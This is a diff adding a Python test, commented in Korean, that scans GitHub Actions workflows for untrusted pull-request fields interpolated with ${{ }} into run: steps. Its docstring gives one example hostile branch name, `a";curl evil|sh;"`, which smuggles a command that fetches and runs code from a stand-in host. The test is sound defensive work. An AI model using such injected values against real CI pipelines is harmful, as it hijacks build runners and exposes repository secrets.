@@ -128,3 +128,50 @@ def test_every_workflow_parses(name: str) -> None:
     """파싱되지 않는 워크플로는 조용히 안 돈다."""
     doc = YAML(typ="safe").load((WF / name).read_text(encoding="utf-8"))
     assert isinstance(doc, dict) and doc.get("jobs"), f"{name} 에 jobs 가 없다"
+
+
+# ★ 2026-09-20 (PLAN §13 W3-15). 공격자가 값을 정할 수 있는 컨텍스트.
+#   포크 PR 에서 브랜치 이름 · 제목 · 본문 · 작성자명은 전부 남이 쓴다.
+UNTRUSTED = ("github.head_ref", "github.event.pull_request.title",
+             "github.event.pull_request.body", "github.event.pull_request.head.ref",
+             "github.event.comment.body", "github.event.issue.title",
+             "github.event.issue.body", "github.event.head_commit.message")
+
+_RUN_BLOCK = re.compile(r"^(\s+)run:\s*\|?\s*$\n((?:\1\s+.*\n|\s*\n)*)", re.M)
+
+
+def test_untrusted_context_is_never_interpolated_into_run() -> None:
+    """`run:` 안에 **남이 정하는 값**을 `${{ }}` 로 박지 않는가.
+
+    ★ 2026-09-20 실물. `contract.yml` 이 `git fetch … "+${{ github.head_ref }}"`
+      를 쓰고 있었다. `${{ }}` 는 **셸이 보기 전에** 치환되므로 따옴표로는
+      못 막는다. 포크 PR 의 브랜치 이름이 `a";curl evil|sh;"` 면 그대로 돈다.
+
+    ★ 고치는 법은 `env:` 로 건네고 `"$VAR"` 로 쓰는 것이다. 그러면 값이
+      인자로만 남는다. GitHub 권장이고 `actionlint` 의 `expression` 규칙이
+      같은 자리를 지목한다 — 이 시험은 그 도구가 없는 기계에서도 든다.
+
+    ★ **인스턴스가 아니라 클래스를 본다.** 한 줄을 고치는 것으로 끝내면
+      다음 워크플로가 같은 것을 다시 쓴다(§197-2 와 같은 자리).
+    """
+    bad = []
+    for p in sorted(WF.glob("*.yml")):
+        src = p.read_text(encoding="utf-8")
+        for m in _RUN_BLOCK.finditer(src):
+            body = m.group(2)
+            line0 = src[:m.start()].count("\n") + 1
+            for k, line in enumerate(body.splitlines()):
+                if line.lstrip().startswith("#"):
+                    continue
+                for ctx in UNTRUSTED:
+                    if "${{" in line and ctx in line:
+                        bad.append(f"  {p.name}:{line0 + k + 1}  {ctx}  — {line.strip()[:70]}")
+    assert not bad, (
+        "`run:` 안에 신뢰할 수 없는 값을 직접 보간한다. " + str(len(bad)) + "건\n"
+        + "\n".join(bad)
+        + "\n\n  `${{ }}` 는 셸이 보기 전에 치환된다 — 따옴표로 못 막는다.\n"
+          "  env 로 건네고 \"$VAR\" 로 써라:\n"
+          "      env:\n"
+          "        HEAD_REF: ${{ github.head_ref }}\n"
+          "      run: |\n"
+          "        git fetch origin \"+$HEAD_REF\"")
